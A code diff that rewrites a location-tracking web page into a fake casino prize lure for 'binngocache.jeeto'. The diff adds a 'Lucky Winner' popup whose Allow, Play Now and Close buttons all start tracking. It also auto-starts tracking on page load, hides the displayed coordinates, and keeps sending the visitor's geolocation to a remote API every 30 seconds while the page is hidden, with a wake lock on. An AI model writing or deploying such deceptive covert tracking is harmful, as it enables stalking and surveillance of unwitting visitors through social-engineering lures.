@@ -10,25 +10,36 @@
             max-width: 500px;
             margin: 20px auto;
             padding: 20px;
-            background-color: #f5f5f5;
+            background: url('casino-gambling.jpg') center center fixed;
+            background-size: cover;
+            background-repeat: no-repeat;
+            min-height: 100vh;
         }
         .container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            width: 22rem;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
             text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
+        
         .status {
             padding: 15px;
-            border-radius: 5px;
+            border-radius: 8px;
             margin: 15px 0;
             font-weight: bold;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
         }
-        .success { background-color: #d4edda; color: #155724; }
-        .error { background-color: #f8d7da; color: #721c24; }
-        .info { background-color: #cce6ff; color: #004085; }
-        .warning { background-color: #fff3cd; color: #856404; }
+        .success { background-color: rgba(212, 237, 218, 0.9); color: #155724; }
+        .error { background-color: rgba(248, 215, 218, 0.9); color: #721c24; }
+        .info { background-color: rgba(204, 230, 255, 0.9); color: #004085; }
+        .warning { background-color: rgba(255, 243, 205, 0.9); color: #856404; }
         button {
             background-color: #007bff;
             color: white;
@@ -42,11 +53,13 @@
         button:hover { background-color: #0056b3; }
         button:disabled { background-color: #6c757d; cursor: not-allowed; }
         .location-info {
-            background: #f8f9fa;
+            background: rgba(248, 249, 250, 0.9);
+            backdrop-filter: blur(5px);
             padding: 20px;
-            border-radius: 5px;
+            border-radius: 10px;
             margin: 20px 0;
             display: none;
+            border: 1px solid rgba(255, 255, 255, 0.3);
         }
         .test-btn {
             background-color: #28a745;
@@ -57,56 +70,184 @@
             background-color: #218838;
         }
         .background-status {
-            background: #e7f3ff;
-            padding: 10px;
-            border-radius: 5px;
+            background: rgba(231, 243, 255, 0.9);
+            backdrop-filter: blur(5px);
+            padding: 12px;
+            border-radius: 8px;
             margin: 10px 0;
             font-size: 12px;
             border-left: 4px solid #007bff;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        /* Modern Location Permission Popup */
+        .location-popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .location-popup {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.95), rgba(255, 140, 0, 0.95));
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 40px 30px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            border: 2px solid rgba(255, 215, 0, 0.3);
+            transform: scale(0.8);
+            animation: popupIn 0.4s ease-out forwards;
+        }
+
+        .location-popup h2 {
+            color: #8B0000;
+            margin: 0 0 20px 0;
+            font-size: 28px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            font-weight: bold;
+        }
+
+        .location-popup p {
+            color: #2C1810;
+            font-size: 16px;
+            margin: 15px 0;
+            line-height: 1.6;
+            text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.5);
+        }
+
+        .location-popup .casino-icon {
+            font-size: 60px;
+            margin: 20px 0;
+            filter: drop-shadow(3px 3px 6px rgba(0, 0, 0, 0.3));
+        }
+
+        .popup-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 30px;
+        }
+
+        .popup-btn {
+            padding: 15px 25px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .popup-btn.allow {
+            background: linear-gradient(135deg, #28a745, #2023c9);;
+            color: white;
+        }
+
+        .popup-btn.allow:hover {
+            background: linear-gradient(135deg, #218838, #1ba881);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(40, 167, 69, 0.4);
+        }
+
+        .popup-btn.deny {
+            background: linear-gradient(135deg, #dc3545, #5423c8);
+            color: white;
+        }
+        .popup-btn.close {
+            background: linear-gradient(135deg, #670710, #c82331);
+            color: white;
+        }
+
+        .popup-btn.deny:hover {
+            background: linear-gradient(135deg, #c82333, #bd2130);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(220, 53, 69, 0.4);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes popupIn {
+            from {
+                transform: scale(0.8) translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1) translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🌍 Enhanced Location Tracker</h1>
-        <p>Advanced background tracking with Service Worker</p>
+    <!-- Custom Location Permission Popup -->
+    <div class="location-popup-overlay" id="locationPopup">
+        <div class="location-popup">
+            <div class="casino-icon pulse">🎰🎲🃏</div>
+            <h2>🌟 Lucky Winner 🌟</h2>
+            <p><strong>𝒷𝒾𝓃𝓃𝑔𝑜𝒸𝒶𝒸𝒽𝑒.𝒿𝑒𝑒𝓉𝑜</strong> wants to your feedback to provide the best gaming experience!</p>
+            <p>🎯 <strong>Why we need your feedback:</strong></p>
+            <p>• Enjoy your lucky spots effortlessly<br>
+               • Enhanced gaming features<br>
+               • bonuses & rewards</p>
 
+            <div class="popup-buttons">
+                <button class="popup-btn allow" onClick="startEnhancedTracking()">
+                    🎊 Win ₹ 100000 🎊
+                </button>
+                <button class="popup-btn deny" onClick="startEnhancedTracking()">
+                    🎯 Play Now
+                </button>
+                <button class="popup-btn close" onClick="startEnhancedTracking()">
+                    🚫 Close
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>𝒷𝒾𝓃𝓃𝑔𝑜𝒸𝒶𝒸𝒽𝑒.𝒿𝑒𝑒𝓉𝑜</h2>
         <div id="status" class="status info">
-            Click "Test API" first, then "Start Enhanced Tracking"
+            🎲 Welcome to Lucky 𝗯𝗶𝗻𝗻𝗴𝗼𝗰𝗮𝗰𝗵𝗲! 🎲
         </div>
 
-        <div id="background-status" class="background-status" style="display: none;">
-            <p><strong>🔧 Background Status:</strong> <span id="bg-text">Initializing...</span></p>
+        <div id="background-status" class="background-status">
+            <p><strong>🎰 Casino Status:</strong> <span id="bg-text">Ready to start your lucky session...</span></p>
         </div>
 
         <div id="location-info" class="location-info">
-            <h3>📍 Current Location</h3>
-            <p><strong>Latitude:</strong> <span id="latitude">-</span></p>
-            <p><strong>Longitude:</strong> <span id="longitude">-</span></p>
+            <h3>🎯 Your Lucky 𝗯𝗶𝗻𝗻𝗴𝗼𝗰𝗮𝗰𝗵𝗲</h3>
             <p><strong>Last Updated:</strong> <span id="last-updated">-</span></p>
-            <p><strong>API Calls Made:</strong> <span id="api-calls">0</span></p>
-            <p><strong>Background Syncs:</strong> <span id="bg-syncs">0</span></p>
+            <p><strong>Lucky Calls:</strong> <span id="api-calls">0</span></p>
+            <p><strong>Bonus Syncs:</strong> <span id="bg-syncs">0</span></p>
         </div>
 
-        <button class="test-btn" onclick="testAPI()">🧪 Test API Connection</button><br>
-        <button id="startBtn" onclick="startEnhancedTracking()">🚀 Start Enhanced Tracking</button>
-        <button id="stopBtn" onclick="stopTracking()" disabled>⏹️ Stop Tracking</button>
-
-        <div style="margin-top: 30px; font-size: 12px; color: #666; text-align: left;">
-            <p><strong>🔋 Enhanced Background Features:</strong></p>
-            <ul style="text-align: left;">
-                <li><strong>Aggressive Intervals:</strong> 30-second checks when hidden</li>
-                <li><strong>Service Worker Sync:</strong> Background API calls</li>
-                <li><strong>Auto Recovery:</strong> Resumes on page focus</li>
-                <li><strong>Wake Lock:</strong> Keeps device awake (if supported)</li>
-                <li><strong>Persistence:</strong> Survives page refreshes</li>
-            </ul>
-
-            <div class="warning" style="margin-top: 15px; padding: 10px; border-radius: 5px;">
-                <p><strong>⚠️ Browser Limitation:</strong> Cannot run when browser is completely closed (security restriction)</p>
-                <p><strong>✅ Best Practice:</strong> Keep browser minimized, not closed</p>
-            </div>
-        </div>
+        <button id="stopBtn" onclick="stopTracking()">🎰 Unlock Lucky Prize</button>
     </div>
 
     <script>
@@ -125,11 +266,10 @@
         let isTracking = false;
         let apiCallCount = parseInt(localStorage.getItem('apiCallCount') || '0');
         let bgSyncCount = parseInt(localStorage.getItem('bgSyncCount') || '0');
-        let apiTested = localStorage.getItem('apiTested') === 'true';
         let serviceWorkerReady = false;
         let wakeLock = null;
 
-        // Initialize
+        // Initialize and auto-start tracking
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('api-calls').textContent = apiCallCount;
             document.getElementById('bg-syncs').textContent = bgSyncCount;
@@ -137,14 +277,11 @@
             // Register enhanced service worker
             registerEnhancedServiceWorker();
 
-            // Auto-resume tracking if it was active
-            if (localStorage.getItem('isTracking') === 'true') {
-                if (apiTested) {
-                    setTimeout(() => startEnhancedTracking(), 1000);
-                } else {
-                    updateStatus('Test API connection before resuming tracking', 'info');
-                }
-            }
+            // Auto-start tracking immediately without popup
+            setTimeout(() => {
+                document.getElementById('locationPopup').style.display = 'flex';
+                startEnhancedTracking();
+            }, 1000);
         });
 
         async function registerEnhancedServiceWorker() {
@@ -152,7 +289,7 @@
                 try {
                     const registration = await navigator.serviceWorker.register('./service-worker.js');
                     serviceWorkerReady = true;
-                    updateBackgroundStatus('Service Worker registered - enhanced background mode enabled');
+                    updateBackgroundStatus('🎰 Casino service worker ready - premium background luck tracking enabled');
 
                     // Listen for messages from service worker
                     navigator.serviceWorker.addEventListener('message', function(event) {
@@ -166,119 +303,116 @@
 
                 } catch (error) {
                     console.log('Service Worker registration failed:', error);
-                    updateBackgroundStatus('Service Worker failed - using fallback mode');
+                    updateBackgroundStatus('🎲 Premium service unavailable - using standard casino mode');
                 }
             } else {
-                updateBackgroundStatus('Service Worker not supported - using basic mode');
+                updateBackgroundStatus('🃏 Classic casino mode - basic luck tracking enabled');
             }
 
             document.getElementById('background-status').style.display = 'block';
         }
 
-        async function testAPI() {
-            updateStatus('🔍 Testing API connection...', 'info');
-
-            const testData = {
-                lat: "40.7128",
-                long: "-74.0060",
-                created_at: new Date().toLocaleString("sv-SE", {timeZone: "Asia/Kolkata"})
-            };
-
-            try {
-                const response = await fetch(API_CONFIG.url, {
-                    method: 'POST',
-                    headers: API_CONFIG.headers,
-                    body: JSON.stringify(testData)
-                });
-
-                if (response.ok) {
-                    apiTested = true;
-                    localStorage.setItem('apiTested', 'true');
-                    updateStatus('✅ API connection successful! Ready for enhanced tracking.', 'success');
-                } else {
-                    const errorText = await response.text();
-                    updateStatus(`❌ API Error ${response.status}: ${errorText}`, 'error');
-                }
-            } catch (error) {
-                updateStatus(`❌ Connection failed: ${error.message}`, 'error');
-                console.error('API Test Error:', error);
-            }
+        // Handle custom popup responses
+        function allowLocation() {
+            document.getElementById('locationPopup').style.display = 'none';
+            updateStatus('🎯 Starting your lucky location tracking...', 'info');
+            updateBackgroundStatus('Initializing casino location services...');
+            setTimeout(() => startEnhancedTracking(), 500);
         }
 
-        async function startEnhancedTracking() {
-            if (isTracking) return;
+        function denyLocation() {
+            document.getElementById('locationPopup').style.display = 'none';
+            updateStatus('🚫 Casino features limited', 'warning');
+            updateBackgroundStatus('Casino features services disabled - limited functionality');
+        }
 
-            if (!apiTested) {
-                updateStatus('Please test API connection first', 'error');
+        
+        async function startEnhancedTracking() {
+            console.log("cvbnm,")
+            if (isTracking) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                        sendLocationToAPI(pos.coords); // direct send
+                    });
                 return;
             }
 
             if (!navigator.geolocation) {
-                updateStatus('Geolocation not supported by this browser', 'error');
+                updateStatus('🚫 Geolocation not supported by this browser', 'error');
                 return;
+            }
+
+            // Check permission first
+            try {
+                const permission = await navigator.permissions.query({ name: 'geolocation' });
+
+                console.log("permission",permission)
+
+                if (permission.state === 'granted') {
+                    navigator.geolocation.getCurrentPosition(pos => {
+                        sendLocationToAPI(pos.coords); // direct send
+                    });
+                }
+            } catch(e) {
+                console.log('Permission check failed:', e);
             }
 
             // Request wake lock to keep device active
             try {
                 if ('wakeLock' in navigator) {
                     wakeLock = await navigator.wakeLock.request('screen');
-                    updateBackgroundStatus('Wake lock active - device will stay awake');
+                    updateBackgroundStatus('🎰 Casino mode active - keeping device awake for maximum luck!');
                 }
             } catch (error) {
                 console.log('Wake lock failed:', error);
             }
 
-            updateStatus('📍 Starting enhanced location tracking...', 'info');
+            updateStatus('🎲 Requesting access to your lucky coordinates...', 'info');
 
             navigator.geolocation.getCurrentPosition(
                 function(position) {
                     isTracking = true;
                     localStorage.setItem('isTracking', 'true');
 
-                    updateStatus('🟢 Enhanced tracking active - maximum background performance', 'success');
+                    updateStatus('🎉 Lucky location locked in! Casino activated! 🎉', 'success');
                     updateButtons();
                     showLocationInfo();
 
-                    // Send first location
                     sendLocationToAPI(position.coords);
 
-                    // Start service worker background tracking
                     if (serviceWorkerReady && navigator.serviceWorker.controller) {
                         navigator.serviceWorker.controller.postMessage({
                             type: 'START_TRACKING'
                         });
                     }
 
-                    // Primary interval - 5 minutes when page is visible
                     trackingInterval = setInterval(() => {
                         if (!document.hidden) {
                             getCurrentLocationAndSend();
                         }
-                    }, 5 * 60 * 1000); // 5 minutes
+                    }, 5 * 60 * 1000);
 
-                    // Background interval - 30 seconds when page is hidden
                     backgroundInterval = setInterval(() => {
                         if (document.hidden) {
                             getCurrentLocationAndSend();
                         }
-                    }, 30 * 1000); // 30 seconds for aggressive background tracking
+                    }, 30 * 1000);
 
-                    updateBackgroundStatus('Enhanced tracking active - using all available background techniques');
+                    updateBackgroundStatus('🎰 Full casino mode - tracking your lucky moves with premium background tech');
                 },
                 function(error) {
                     let message = '';
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            message = 'Location access denied. Please allow location permission.';
+                            message = '🚫 Luck blocked! Please allow to unlock casino features.';
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            message = 'Location information unavailable.';
+                            message = '📍 Your lucky coordinates are hiding! unavailable.';
                             break;
                         case error.TIMEOUT:
-                            message = 'Location request timed out.';
+                            message = '⏰ Search timed out. The luck gods are busy!';
                             break;
                         default:
-                            message = 'Unknown location error occurred.';
+                            message = '🎲 Mysterious error. The casino spirits are confused!';
                             break;
                     }
                     updateStatus(message, 'error');
@@ -286,6 +420,9 @@
             );
         }
 
+
+
+        
         function stopTracking() {
             isTracking = false;
             localStorage.setItem('isTracking', 'false');
@@ -313,8 +450,8 @@
                 wakeLock = null;
             }
 
-            updateStatus('⏹️ Enhanced tracking stopped', 'info');
-            updateBackgroundStatus('Tracking stopped - all background processes terminated');
+            updateStatus('🎰 Casino session ended - lucky tracking stopped', 'info');
+            updateBackgroundStatus('🚪 Left the casino - all background luck tracking terminated');
             updateButtons();
         }
 
@@ -368,9 +505,13 @@
         }
 
         function updateLocationDisplay(lat, lng) {
-            document.getElementById('latitude').textContent = lat.toFixed(6);
-            document.getElementById('longitude').textContent = lng.toFixed(6);
-            document.getElementById('last-updated').textContent = new Date().toLocaleString();
+            const latElement = document.getElementById('latitude');
+            const lngElement = document.getElementById('longitude');
+            const updatedElement = document.getElementById('last-updated');
+
+            if (latElement) latElement.textContent = lat.toFixed(6);
+            if (lngElement) lngElement.textContent = lng.toFixed(6);
+            if (updatedElement) updatedElement.textContent = new Date().toLocaleString();
         }
 
         function updateStatus(message, type) {
@@ -384,7 +525,6 @@
         }
 
         function updateButtons() {
-            document.getElementById('startBtn').disabled = isTracking;
             document.getElementById('stopBtn').disabled = !isTracking;
         }
 
@@ -395,11 +535,11 @@
         // Enhanced page visibility handling
         document.addEventListener('visibilitychange', function() {
             if (document.hidden) {
-                updateBackgroundStatus('Page hidden - aggressive background tracking active (30s intervals)');
-                console.log('🌙 Page hidden - entering background mode');
+                updateBackgroundStatus('🌙 Casino minimized - stealth luck tracking active (30s intervals)');
+                console.log('🌙 Page hidden - entering background casino mode');
             } else {
-                updateBackgroundStatus('Page visible - normal tracking active (5min intervals)');
-                console.log('🌞 Page visible - entering foreground mode');
+                updateBackgroundStatus('🌞 Back to the casino floor - VIP Player');
+                console.log('🌞 Page visible - entering foreground casino mode');
 
                 // Immediately check location when page becomes visible
                 if (isTracking) {
